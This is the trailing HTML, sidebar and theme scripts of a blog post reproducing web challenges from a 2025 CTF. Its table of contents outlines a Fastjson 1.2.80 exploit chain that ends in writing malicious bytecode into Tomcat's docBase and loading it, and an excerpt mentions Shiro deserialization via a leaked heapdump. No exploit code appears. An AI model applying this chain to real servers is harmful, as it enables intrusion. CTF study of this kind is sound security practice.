class="toc-item toc-level-4"><a class="toc-link" href="#rmb"><span class="toc-number">4.1.3.</span> <span class="toc-text"> rmb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#inflateroutputstream"><span class="toc-number">4.1.4.</span> <span class="toc-text"> InflaterOutputStream</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">4.2.</span> <span class="toc-text"> 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Edemo-fastjson1280%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%99%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.1.</span> <span class="toc-text"> ‍漏洞Demo-Fastjson1.2.80的任意写利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#step1-%E6%8A%8Ajavaioinputstream-%E5%8A%A0%E5%85%A5-fastjson-autotype-%E7%BC%93%E5%AD%98"><span class="toc-number">4.2.1.1.</span> <span class="toc-text"> Step1: 把java.io.InputStream 加入 fastjson autotype 缓存</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step2-file%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96tmp%E5%86%85%E5%AE%B9%E8%8E%B7%E5%8F%96tomcat%E7%9A%84docbase%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0"><span class="toc-number">4.2.1.2.</span> <span class="toc-text"> Step2: file协议读取&#x2F;tmp内容，获取tomcat的docbase文件名称</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step3-%E5%86%99%E5%85%A5%E6%81%B6%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81%E5%88%B0docbase%E7%9B%AE%E5%BD%95%E4%B8%8B"><span class="toc-number">4.2.1.3.</span> <span class="toc-text"> Step3: 写入恶意字节码到docbase目录下</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step4-%E8%A7%A6%E5%8F%91%E6%81%B6%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.2.1.4.</span> <span class="toc-text"> Step4: 触发恶意类加载</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">4.2.2.</span> <span class="toc-text"> EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%84%9F%E6%83%B3"><span class="toc-number">5.</span> <span class="toc-text"> 感想</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "京麟CTF2025web复现",
+          url: "http://example.com/2025/08/12/%E4%BA%AC%E9%BA%92CTf2025web%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "没找到复现环境，直接跟着大佬的博客来复现 [TOC]  热身赛-Execute 无参数利用，读文件，发现readfile没有被ban，直接梭，或者变量拼接也可以   热身赛-EzLogin(Shiro反序列化)  发现有个记住我，抓包发现使用了Shiro，猜测有Shiro反序列化漏洞，但一把梭没梭出密钥 扫一下目录  发现使用了actuator组件 典型的heapdump泄露 利用工具整理出heapdump文件中的密钥：  然后利用Shiro反序列化工具一把梭即可  初赛-计算器 题目要求输入密",
+          date: "Tue Aug 12 2025 18:42:06 GMT+0800",
+          updated: "Sat Jun 06 2026 12:06:28 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
